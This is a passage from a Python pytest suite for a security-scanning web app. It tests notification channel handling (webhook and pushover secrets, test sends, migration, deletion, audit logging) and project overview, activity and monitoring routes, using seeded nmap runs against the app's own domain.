    def test_notification_channel_create_rolls_back_secret_when_row_insert_fails(self, monkeypatch, tmp_path):
        from services.notifications import channels_store
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        _client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_atomic_secret"
            self._register_session_token(session_id)
            monkeypatch.setattr(channels_store, "_channel_id", lambda: "ntc_atomic_secret")
            created = channels_store.create_notification_channel(
                session_id,
                {
                    "kind": "webhook",
                    "label": "Atomic webhook",
                    "secret_values": {"url": "https://first.example.invalid/hook"},
                    "triggers": ["run_complete"],
                },
            )
            with pytest.raises(Exception):
                channels_store.create_notification_channel(
                    session_id,
                    {
                        "kind": "webhook",
                        "label": "Duplicate webhook",
                        "secret_values": {"url": "https://second.example.invalid/hook"},
                        "triggers": ["run_complete"],
                    },
                )

            assert created["id"] == "ntc_atomic_secret"
            secret_name = channel_secret_name("ntc_atomic_secret", "url")
            assert get_channel_secret(session_id, secret_name) == "https://first.example.invalid/hook"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_dispatches_sync_event(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setitem(config.CFG, "app_name", "darklab_shell")
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            session_id = "tok_notification_test_send"
            created = self._create_webhook_channel(client, session_id)
            assert created.status_code == 201
            channel_id = created.get_json()["channel"]["id"]

            resp = client.post(
                f"/session/notification-channels/{channel_id}/test",
                headers={"X-Session-ID": session_id},
            )
            assert resp.status_code == 200
            payload = resp.get_json()
            assert payload["queued"] == 1
            assert payload["events"] == [{"event_id": payload["event_ids"][0], "status": "sent", "last_error": ""}]
            assert delivered[0][0] == "https://example.invalid/hook"
            assert delivered[0][1]["trigger"] == "test"
            assert delivered[0][1]["app_name"] == "darklab_shell"
            assert delivered[0][1]["message"] == "darklab_shell test notification"
            with db_connect() as conn:
                row = conn.execute(
                    "SELECT status, attempts FROM notification_events WHERE channel_id = ?",
                    (channel_id,),
                ).fetchone()
            assert dict(row) == {"status": "sent", "attempts": 1}
            audit_rows = _audit_event_rows(target_id=channel_id, event_type="notification.config_change")
            assert [row["details"]["action"] for row in audit_rows] == ["create", "test"]
            assert audit_rows[-1]["details"]["count"] == 1
            assert audit_rows[-1]["details"]["result"] == "queued"
            assert "https://example.invalid/hook" not in json.dumps(audit_rows)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_targets_requested_channel(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            session_id = "tok_notification_test_single"
            first = self._create_webhook_channel(client, session_id).get_json()["channel"]
            second_resp = client.post(
                "/session/notification-channels",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Second webhook",
                    "secret_values": {"url": "https://second.example.invalid/hook"},
                    "triggers": ["run_complete"],
                },
            )
            second = second_resp.get_json()["channel"]
            listed_before_update = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert [channel["id"] for channel in listed_before_update.get_json()["channels"]] == [first["id"], second["id"]]
            muted_second = client.patch(
                f"/session/notification-channels/{second['id']}",
                headers={"X-Session-ID": session_id},
                json={"muted": True},
            )
            assert muted_second.status_code == 200
            listed_after_update = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert [channel["id"] for channel in listed_after_update.get_json()["channels"]] == [first["id"], second["id"]]

            resp = client.post(
                f"/session/notification-channels/{second['id']}/test",
                headers={"X-Session-ID": session_id},
            )

            assert resp.status_code == 200
            payload = resp.get_json()
            assert payload["queued"] == 1
            assert payload["events"] == [{"event_id": payload["event_ids"][0], "status": "sent", "last_error": ""}]
            assert delivered == [
                (
                    "https://second.example.invalid/hook",
                    {
                        "trigger": "test",
                        "app_name": "darklab_shell",
                        "channel_id": second["id"],
                        "message": "darklab_shell test notification",
                        "occurred_at": delivered[0][1]["occurred_at"],
                    },
                    "webhook",
                )
            ]
            with db_connect() as conn:
                rows = conn.execute(
                    "SELECT channel_id, status FROM notification_events ORDER BY created"
                ).fetchall()
            assert [(row["channel_id"], row["status"]) for row in rows] == [(second["id"], "sent")]
            assert first["id"] != second["id"]
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_reports_delivery_failure_status(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: ChannelResult.retry("webhook rejected the test"),
        )
        try:
            session_id = "tok_notification_test_failure"
            created = self._create_webhook_channel(client, session_id)
            channel_id = created.get_json()["channel"]["id"]

            resp = client.post(
                f"/session/notification-channels/{channel_id}/test",
                headers={"X-Session-ID": session_id},
            )

            payload = resp.get_json()
            assert resp.status_code == 200
            assert payload["queued"] == 1
            assert payload["events"] == [
                {
                    "event_id": payload["event_ids"][0],
                    "status": "retry_wait",
                    "last_error": "webhook rejected the test",
                }
            ]
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_event_audit_route_lists_session_channel_deliveries(self, monkeypatch, tmp_path):
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_delivery_audit"
            created = self._create_webhook_channel(client, session_id)
            channel_id = created.get_json()["channel"]["id"]
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO notification_events "
                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
                    "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        "nte_browser_delivery",
                        session_id,
                        channel_id,
                        "run_complete",
                        json.dumps({"trigger": "run_complete", "message": "done"}),
                        "sent",
                        1,
                        "",
                        "2026-05-22T07:10:00+00:00",
                        "",
                        "run_browser_delivery",
                        "2026-05-22T07:09:59+00:00",
                        "",
                    ),
                )
                conn.execute(
                    "INSERT INTO notification_events "
                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
                    "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        "nte_project_digest_delivery",
                        session_id,
                        channel_id,
                        "project_digest",
                        json.dumps({
                            "trigger": "project_digest",
                            "project_id": "prj_delivery_audit",
                            "project_name": "External Edge",
                            "project_monitoring_url": "/projects/prj_delivery_audit/monitoring",
                            "digest_identity": {
                                "project_id": "prj_delivery_audit",
                                "session_id": session_id,
                                "team_id": "",
                                "window_start": "2026-05-22T06:00:00+00:00",
                                "window_end": "2026-05-22T07:00:00+00:00",
                            },
                        }),
                        "dead",
                        3,
                        "",
                        "2026-05-22T07:11:00+00:00",
                        "provider rejected digest",
                        "",
                        "2026-05-22T07:10:30+00:00",
                        "2026-05-22T07:11:00+00:00",
                    ),
                )
                conn.execute(
                    "INSERT INTO notification_events "
                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
                    "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        "nte_other_delivery",
                        "tok_other_notification_owner",
                        channel_id,
                        "run_complete",
                        json.dumps({"trigger": "run_complete"}),
                        "sent",
                        1,
                        "",
                        "",
                        "",
                        "",
                        "2026-05-22T07:08:00+00:00",
                        "",
                    ),
                )
                conn.commit()

            resp = client.get(
                f"/session/notification-events?channel_id={channel_id}&limit=5",
                headers={"X-Session-ID": session_id},
            )

            assert resp.status_code == 200
            payload = resp.get_json()
            assert payload["total"] == 2
            digest_event = payload["events"][0]
            assert digest_event["id"] == "nte_project_digest_delivery"
            assert digest_event["project_digest"] == {
                "project_id": "prj_delivery_audit",
                "project_name": "External Edge",
                "window_start": "2026-05-22T06:00:00+00:00",
                "window_end": "2026-05-22T07:00:00+00:00",
                "monitoring_url": "/projects/prj_delivery_audit/monitoring",
            }
            run_event = payload["events"][1]
            assert run_event["id"] == "nte_browser_delivery"
            assert run_event["channel_id"] == channel_id
            assert run_event["status"] == "sent"
            assert run_event["payload"]["message"] == "done"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channels_migrate_with_session_token_and_secrets(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            source_session_id = "tok_notification_migrate_source"
            destination_token = "tok_notification_migrate_dest"
            self._register_session_token(source_session_id)
            self._register_session_token(destination_token)
            created = self._create_webhook_channel(client, source_session_id).get_json()["channel"]
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO notification_events "
                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
                    "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        "nte_migrates_with_channel",
                        source_session_id,
                        created["id"],
                        "test",
                        json.dumps({"trigger": "test"}),
                        "pending",
                        0,
                        "",
                        "",
                        "",
                        "",
                        datetime.now(timezone.utc).isoformat(),
                        "",
                    ),
                )
                conn.commit()

            migrate_resp = client.post(
                "/session/migrate",
                headers={"X-Session-ID": source_session_id},
                json={"from_session_id": source_session_id, "to_session_id": destination_token},
            )
            listed = client.get("/session/notification-channels", headers={"X-Session-ID": destination_token})
            test_resp = client.post(
                f"/session/notification-channels/{created['id']}/test",
                headers={"X-Session-ID": destination_token},
            )

            assert migrate_resp.status_code == 200
            assert migrate_resp.get_json()["migrated_notification_channels"] == 1
            assert migrate_resp.get_json()["migrated_notification_events"] == 1
            assert listed.status_code == 200
            assert listed.get_json()["channels"][0]["id"] == created["id"]
            assert test_resp.status_code == 200
            assert delivered[0][0] == "https://example.invalid/hook"
            with db_connect() as conn:
                source_channel_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM notification_channels WHERE session_token = ?",
                    (source_session_id,),
                ).fetchone()["count"]
                migrated_event = conn.execute(
                    "SELECT session_token FROM notification_events WHERE id = ?",
                    ("nte_migrates_with_channel",),
                ).fetchone()
            assert int(source_channel_count) == 0
            assert migrated_event["session_token"] == destination_token
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_delete_removes_channel_and_vault_secrets(self, monkeypatch, tmp_path):
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_delete"
            self._register_session_token(session_id)
            created = client.post(
                "/session/notification-channels",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "pushover",
                    "label": "Push alerts",
                    "secret_values": {"app_token": "app-secret", "user_key": "user-secret"},
                    "triggers": ["run_complete"],
                },
            )
            assert created.status_code == 201
            channel_id = created.get_json()["channel"]["id"]
            app_secret_name = channel_secret_name(channel_id, "app_token")
            user_secret_name = channel_secret_name(channel_id, "user_key")
            assert get_channel_secret(session_id, app_secret_name) == "app-secret"
            assert get_channel_secret(session_id, user_secret_name) == "user-secret"

            deleted = client.delete(
                f"/session/notification-channels/{channel_id}",
                headers={"X-Session-ID": session_id},
            )
            assert deleted.status_code == 200
            assert deleted.get_json()["removed"] is True

            listed = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert listed.get_json()["channels"] == []
            assert get_channel_secret(session_id, app_secret_name) is None
            assert get_channel_secret(session_id, user_secret_name) is None
            audit_rows = _audit_event_rows(target_id=channel_id, event_type="notification.config_change")
            assert [row["details"]["action"] for row in audit_rows] == ["create", "delete"]
            assert audit_rows[-1]["details"]["kind"] == "pushover"
            audit_json = json.dumps(audit_rows)
            assert "app-secret" not in audit_json
            assert "user-secret" not in audit_json
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


# ── /projects ────────────────────────────────────────────────────────────────

class TestProjectRoutes:
    def _session_id(self, prefix="projects"):
        return f"{prefix}-" + uuid.uuid4().hex[:8]

    def setup_method(self):
        package_presets.clear_package_preset_catalog_cache()

    def teardown_method(self):
        package_presets.clear_package_preset_catalog_cache()

    def _register_session_token(self, session_id):
        with db_connect() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (session_id, datetime.now(timezone.utc).isoformat(), ""),
            )
            conn.commit()

    def _create_team(self, client, session_id, name="Project Activity Team"):
        self._register_session_token(session_id)
        team_name = f"{name} {uuid.uuid4().hex[:8]}"
        resp = client.post(
            "/session/teams",
            headers={"X-Session-ID": session_id},
            json={"name": team_name, "display_name": "Owner"},
        )
        assert resp.status_code == 201
        return resp.get_json()["team"]

    def _join_team(self, client, owner_token, team_id, member_token, *, role="viewer", display_name="Viewer"):
        self._register_session_token(member_token)
        invite = client.post(
            f"/session/teams/{team_id}/invites",
            headers={"X-Session-ID": owner_token},
            json={"role": role, "label": f"{display_name} invite"},
        )
        assert invite.status_code == 201
        joined = client.post(
            "/session/teams/join",
            headers={"X-Session-ID": member_token},
            json={"code": invite.get_json()["invite"]["code"], "display_name": display_name},
        )
        assert joined.status_code in {200, 201}
        return next(
            member for member in joined.get_json()["members"]
            if member["display_name"] == display_name
        )

    def _create_project(self, client, session_id, name="External Review", *, headers=None):
        resp = client.post(
            "/projects",
            json={"name": name, "description": "Quarterly case folder", "color": "green"},
            headers=headers or {"X-Session-ID": session_id},
        )
        assert resp.status_code == 201
        return json.loads(resp.data)["project"]

    def _seed_run(
        self,
        session_id,
        command="nmap darklab.sh",
        *,
        run_id=None,
        run_kind="external",
        owner_tab_id="",
        started="datetime('now')",
    ):
        run_id = run_id or "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                f"VALUES (?, ?, ?, ?, ?, {started}, ?, 0)",
                (run_id, session_id, run_kind, owner_tab_id, command, "[]"),
            )
            conn.commit()
        return run_id

    def _seed_snapshot(self, session_id, label="workspace snapshot", *, snapshot_id=None):
        snapshot_id = snapshot_id or "snap-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) "
                "VALUES (?, ?, ?, datetime('now'), ?)",
                (snapshot_id, session_id, label, "[]"),
            )
            conn.commit()
        return snapshot_id

    def _link_run(self, client, session_id, project_id, run_id):
        resp = client.post(
            f"/projects/{project_id}/links",
            json={"entity_type": "run", "entity_id": run_id, "source": "manual"},
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 201
        return json.loads(resp.data)["link"]

    def _create_target(self, client, session_id, project_id, target_type="domain", value="api.example.com", *, headers=None):
        resp = client.post(
            f"/projects/{project_id}/targets",
            json={"type": target_type, "value": value},
            headers=headers or {"X-Session-ID": session_id},
        )
        assert resp.status_code == 201
        return resp.get_json()["target"]

    def test_project_overview_route_returns_empty_contract_and_404_for_foreign_project(self):
        client = get_client()
        session_id = self._session_id("project-overview-empty")
        foreign_session = self._session_id("project-overview-foreign")
        project = self._create_project(client, session_id, name="Overview Empty")
        foreign_project = self._create_project(client, foreign_session, name="Overview Foreign")

        resp = client.get(
            f"/projects/{project['id']}/overview",
            headers={"X-Session-ID": session_id},
        )
        foreign_resp = client.get(
            f"/projects/{foreign_project['id']}/overview",
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["project"]["id"] == project["id"]
        assert payload["payload_version"] == 1
        assert payload["targets"] == []
        assert payload["rollups"]["target_count"] == 0
        assert payload["rollups"]["certificate_statuses"]["unknown"] == 0
        assert payload["rollups"]["recent_change_state"] == "not-monitored"
        assert payload["recent_changes"] == []
        assert foreign_resp.status_code == 404

    def test_project_overview_route_returns_target_rollup_and_existing_filter_hints(self):
        client = get_client()
        session_id = self._session_id("project-overview")
        project = self._create_project(client, session_id, name="Overview Populated")
        target = self._create_target(client, session_id, project["id"])
        snapshot_id = f"snap-route-overview-{target['id']}"
        finding_id = f"finding-route-overview-{target['id']}"
        now = datetime.now(timezone.utc).isoformat()
        expires_at = (datetime.now(timezone.utc) + timedelta(days=20)).isoformat()
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at, expires_at) "
                "VALUES (?, ?, ?, 'censys', 'ok', ?, ?, ?, ?)",
                (
                    snapshot_id,
                    session_id,
                    target["id"],
                    "Censys route overview",
                    json.dumps({
                        "providers": {
                            "censys": {
                                "ports": [443],
                                "services": ["https"],
                                "certificate": {"not_after": expires_at},
                            },
                        },
                        "summary": {"has_intel": True, "providers_with_data": ["censys"]},
                    }),
                    now,
                    expires_at,
                ),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, entity_id, target_id, subject_key, signature_hash, severity, status, "
                "title, created, last_seen_at) "
                "VALUES (?, ?, ?, ?, ?, ?, 'high', 'new', ?, ?, ?)",
                (
                    finding_id,
                    session_id,
                    target["id"],
                    target["id"],
                    "subject-route-overview",
                    "sig-route-overview",
                    "Overview high finding",
                    now,
                    now,
                ),
            )
            conn.commit()

        resp = client.get(
            f"/projects/{project['id']}/overview",
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["rollups"]["target_count"] == 1
        assert payload["rollups"]["certificate_statuses"]["expiring_30d"] == 1
        assert payload["rollups"]["finding_severities"]["high"] == 1
        target_row = payload["targets"][0]
        assert target_row["entity_id"] == target["id"]
        assert target_row["open_ports"] == [443]
        assert target_row["services"] == ["https"]
        assert target_row["certificate"]["status"] == "expiring_30d"
        assert target_row["top_finding_severity"] == "high"
        assert target_row["deep_link_hints"]["entities"] == {"target_id": target["id"]}
        assert target_row["deep_link_hints"]["findings"] == {
            "target_id": target["id"],
            "orphan_filter": "all",
            "severity": "high",
        }

        entity_params = urlencode(target_row["deep_link_hints"]["entities"])
        finding_params = urlencode(target_row["deep_link_hints"]["findings"])
        entities_resp = client.get(
            f"/projects/{project['id']}/entities?{entity_params}",
            headers={"X-Session-ID": session_id},
        )
        findings_resp = client.get(
            f"/projects/{project['id']}/findings?{finding_params}",
            headers={"X-Session-ID": session_id},
        )

        assert entities_resp.status_code == 200
        assert [item["id"] for item in entities_resp.get_json()["entities"]] == [target["id"]]
        assert findings_resp.status_code == 200
        assert [item["id"] for item in findings_resp.get_json()["findings"]] == [finding_id]

    def test_project_package_and_link_routes_record_audit_events(self):
        client = get_client()
        session_id = self._session_id("project-audit")
        project = self._create_project(client, session_id, name="Audit Case")
        run_id = self._seed_run(session_id, "nmap audit.example")

        self._link_run(client, session_id, project["id"], run_id)
        package_resp = client.post(
            f"/projects/{project['id']}/packages",
            json={"name": "Audit package", "redaction_mode": "redacted"},
            headers={"X-Session-ID": session_id},
        )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]

        package_delete = client.delete(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert package_delete.status_code == 200
        unlink = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert unlink.status_code == 200

        project_events = _audit_event_rows(target_id=project["id"])
        assert [row["event_type"] for row in project_events] == ["project.link", "project.unlink"]
        package_events = _audit_event_rows(target_id=package["id"])
        assert [row["event_type"] for row in package_events] == ["package.build", "package.delete"]
        assert package_events[0]["details"]["redaction_mode"] == "redacted"

    def test_project_activity_route_lists_personal_safe_events_and_filters(self):
        from services.audit.models import AuditEventType
        from services.audit.recorder import record_event
        from services.teams.storage import token_hash

        client = get_client()
        session_id = self._session_id("project-activity")
        project = self._create_project(client, session_id, name="Activity Case")

        with db_connect() as conn:
            record_event(
                AuditEventType.PROJECT_LINK,
                session_id=session_id,
                target_id=project["id"],
                project_id=project["id"],
                details={"source": "test", "correlation_id": "corr-hidden"},
                conn=conn,
                cfg={"audit_log_enabled": True},
                created="2026-06-06T12:00:00+00:00",
            )
            record_event(
                AuditEventType.FINDING_REVIEW_CHANGE,
                session_id=session_id,
                target_id="finding-activity",
                project_id=project["id"],
                details={"review_state": "confirmed"},
                conn=conn,
                cfg={"audit_log_enabled": True},
                created="2026-06-06T12:00:01+00:00",
            )
            record_event(
                AuditEventType.PROJECT_LINK,
                session_id=session_id,
                team_id="team_should_not_leak",
                target_id="team-row",
                project_id=project["id"],
                details={"source": "test"},
                conn=conn,
                cfg={"audit_log_enabled": True},
                created="2026-06-06T12:00:02+00:00",
            )
            conn.commit()

        first_page = client.get(
            f"/projects/{project['id']}/activity?limit=1",
            headers={"X-Session-ID": session_id},
        )
        assert first_page.status_code == 200
        first_payload = first_page.get_json()
        assert first_payload["has_more"] is True
        assert [event["target"]["id"] for event in first_payload["events"]] == ["finding-activity"]

        filtered = client.get(
            f"/projects/{project['id']}/activity?event_type=project.link&date_from=2026-06-06&date_to=2026-06-06",
            headers={"X-Session-ID": session_id},
        )
        payload = filtered.get_json()
        assert filtered.status_code == 200
        assert [event["target"]["id"] for event in payload["events"]] == [project["id"]]
        event_json = json.dumps(payload["events"])
        assert "owner_session_hash" not in event_json
        assert "actor_session_hash" not in event_json
        assert "actor_session_label" not in event_json
        assert "corr-hidden" not in event_json
        assert "team-row" not in event_json
        hidden_actor = client.get(
            f"/projects/{project['id']}/activity?actor={quote(token_hash(session_id))}",
            headers={"X-Session-ID": session_id},
        )
        assert hidden_actor.status_code == 200
        assert hidden_actor.get_json()["events"] == []

    def test_project_monitoring_route_returns_scoped_watchers_and_missing_run_state(self):
        from core.helpers import get_log_session_id
        from services.watchers import service as watcher_service

        client = get_client()
        session_id = "tok_project_monitoring_" + uuid.uuid4().hex[:8]
        self._register_session_token(session_id)
        project = self._create_project(client, session_id, name="Monitoring Case")
        run_id = self._seed_run(session_id, "nmap -sV darklab.sh")

        with db_connect() as conn:
            watcher = watcher_service.create_watcher(
                session_id,
                command_text="nmap -sV darklab.sh",
                baseline_run_id="run-deleted",
                project_id=project["id"],
                cadence_preset="hourly",
                conn=conn,
            )
            watcher_service.record_watcher_fire(
                conn,
                watcher,
                run_id=run_id,
                diff_summary={
                    "classifier": "ports",
                    "added_port_count": 1,
                    "added_ports": [{"key": "443/tcp", "state": "open", "service": "https"}],
                },
                diff_kind="signal",
                state_at_fire="changed",
                state_reason="diff_detected",
                fire_kind="changed",
            )
            watcher_service.set_watcher_state(
                watcher.id,
                state="changed",
                state_reason="diff_detected",
                last_run_id=run_id,
                conn=conn,
            )
            conn.commit()

        with mock.patch.object(project_routes.log, "info") as info_log:
            resp = client.get(
                f"/projects/{project['id']}/monitoring",
                headers={"X-Session-ID": session_id},
            )
            summary_resp = client.get(
                f"/projects/{project['id']}/monitoring/summary",
                headers={"X-Session-ID": session_id},
            )
            window_summary_resp = client.get(
                f"/projects/{project['id']}/monitoring/summary"
                "?window_start=2026-01-01T00:00:00Z&window_end=2027-01-01T00:00:00Z",
                headers={"X-Session-ID": session_id},
            )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["counts"]["changed"] == 1
        assert payload["monitors"][0]["id"] == watcher.id
        assert payload["monitors"][0]["dashboard_state"] == "changed"
        assert payload["timeline"][0]["fire_kind"] == "changed"
        assert payload["timeline"][0]["run_available"] is True
        assert payload["timeline"][0]["baseline_run_available"] is False
        assert payload["summary"]["changed_monitor_count"] == 1
        assert payload["summary"]["failed_monitor_count"] == 0
        assert payload["summary"]["highest_severity"] == "critical"
        assert payload["summary"]["links"]["project_monitoring"] == f"/projects/{project['id']}/monitoring"
        assert summary_resp.status_code == 200
        summary_payload = summary_resp.get_json()
        assert summary_payload["project"]["id"] == project["id"]
        assert summary_payload["summary"] == payload["summary"]
        assert window_summary_resp.status_code == 200
        window_summary_payload = window_summary_resp.get_json()
        assert window_summary_payload["digest_window"]["start"] == "2026-01-01T00:00:00+00:00"
        assert window_summary_payload["digest_window"]["end"] == "2027-01-01T00:00:00+00:00"
        assert window_summary_payload["window_summary"]["changed_monitor_count"] == 1
        assert window_summary_payload["window_summary"]["top_changes"][0]["fire_kind"] == "changed"
        viewed = next(call for call in info_log.call_args_list if call.args == ("PROJECT_MONITORING_VIEWED",))
        assert viewed.kwargs["extra"] == {
            "ip": mock.ANY,
            "session": get_log_session_id(session_id),
            "team_id": "",
            "project_id": project["id"],
            "fire_limit": 8,
            "monitor_count": 1,
            "timeline_count": 1,
            "changed_count": 1,
            "failed_count": 0,
            "highest_severity": "critical",
        }
        summary_viewed = next(call for call in info_log.call_args_list if call.args == ("PROJECT_MONITORING_SUMMARY_VIEWED",))
        assert summary_viewed.kwargs["extra"] == {
            "ip": mock.ANY,
            "session": get_log_session_id(session_id),
            "team_id": "",
            "project_id": project["id"],
            "fire_limit": 8,
            "changed_count": 1,
            "failed_count": 0,
            "highest_severity": "critical",
            "top_change_count": 1,
            "windowed": False,
            "window_changed_count": 0,
            "window_recovered_count": 0,
            "window_failed_count": 0,
            "window_highest_severity": "",
            "window_top_change_count": 0,
            "window_fire_count": 0,
        }
        window_summary_viewed = [
            call for call in info_log.call_args_list
            if call.args == ("PROJECT_MONITORING_SUMMARY_VIEWED",) and call.kwargs["extra"]["windowed"]
        ][0]
        assert window_summary_viewed.kwargs["extra"]["changed_count"] == 1
        assert window_summary_viewed.kwargs["extra"]["top_change_count"] == 1
        assert window_summary_viewed.kwargs["extra"]["window_changed_count"] == 1
        assert window_summary_viewed.kwargs["extra"]["window_recovered_count"] == 0
        assert window_summary_viewed.kwargs["extra"]["window_failed_count"] == 0
        assert window_summary_viewed.kwargs["extra"]["window_highest_severity"] == "critical"
        assert window_summary_viewed.kwargs["extra"]["window_top_change_count"] == 1
        assert window_summary_viewed.kwargs["extra"]["window_fire_count"] == 1

        anonymous_session_id = "anon_project_monitoring_" + uuid.uuid4().hex[:8]
        anonymous_project = self._create_project(
            client,
            anonymous_session_id,
            name="Anonymous Monitoring",
        )
        anonymous_resp = client.get(
            f"/projects/{anonymous_project['id']}/monitoring",
            headers={"X-Session-ID": anonymous_session_id},
        )

        assert anonymous_resp.status_code == 200
        anonymous_payload = anonymous_resp.get_json()
        assert anonymous_payload["notification_channels"] == []
        assert anonymous_payload["can_manage_digest_settings"] is False
        assert anonymous_payload["digest_settings"]["enabled"] is False

    def test_project_monitoring_route_keeps_deleted_current_run_state(self):
        from services.watchers import service as watcher_service

        client = get_client()
        session_id = "tok_project_monitoring_deleted_current_" + uuid.uuid4().hex[:8]
        self._register_session_token(session_id)
        project = self._create_project(client, session_id, name="Monitoring Deleted Current")
        suffix = uuid.uuid4().hex[:8]
        baseline_run_id = self._seed_run(
            session_id,
            "nmap -sV darklab.sh",
            run_id=f"run-monitoring-baseline-{suffix}",
        )
        deleted_run_id = f"run-monitoring-deleted-current-{suffix}"

        with db_connect() as conn:
            watcher = watcher_service.create_watcher(
                session_id,
                command_text="nmap -sV darklab.sh",
                baseline_run_id=baseline_run_id,
                project_id=project["id"],
                cadence_preset="hourly",
                conn=conn,
            )
            fire = watcher_service.record_watcher_fire(
                conn,
                watcher,
                run_id=deleted_run_id,
                diff_summary={
                    "classifier": "ports",
                    "added_port_count": 1,
                    "added_ports": [{"key": "443/tcp", "state": "open", "service": "https"}],
                },
                diff_kind="signal",
                state_at_fire="changed",
                state_reason="diff_detected",
                fire_kind="changed",
            )
            watcher_service.set_watcher_state(
                watcher.id,
                state="changed",
                state_reason="diff_detected",
                last_run_id=deleted_run_id,
                conn=conn,
            )
            conn.commit()

        resp = client.get(
            f"/projects/{project['id']}/monitoring",
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["timeline"][0]["id"] == fire.id
        assert payload["timeline"][0]["run_available"] is False
        assert payload["timeline"][0]["baseline_run_available"] is True
        assert payload["timeline"][0]["run"] is None
        assert payload["timeline"][0]["baseline_run"]["id"] == baseline_run_id
        assert payload["monitors"][0]["latest_fire"]["id"] == fire.id
        assert payload["monitors"][0]["latest_fire"]["run_available"] is False
        assert payload["summary"]["top_changes"][0]["run_available"] is False
        assert payload["summary"]["top_changes"][0]["baseline_run_available"] is True

    def test_project_monitoring_route_scopes_target_filter_options(self):
        from services.watchers import service as watcher_service

        client = get_client()
        session_id = "tok_project_monitoring_targets_" + uuid.uuid4().hex[:8]
        other_session_id = "tok_project_monitoring_other_" + uuid.uuid4().hex[:8]
        self._register_session_token(session_id)
        self._register_session_token(other_session_id)
        project = self._create_project(client, session_id, name="Monitoring Targets")
        suffix = uuid.uuid4().hex[:8]
        visible_entity_id = f"ent_monitor_visible_{suffix}"

        with db_connect() as conn:
            watcher = watcher_service.create_watcher(
                session_id,
                command_text="nmap -sV visible.darklab.sh suppressed.darklab.sh foreign.darklab.sh",
                project_id=project["id"],
                cadence_preset="hourly",
                conn=conn,
            )
            now = "2026-06-15T12:00:00+00:00"
            for entity_id, owner, value, suppressed in (
                (visible_entity_id, session_id, "visible.darklab.sh", 0),
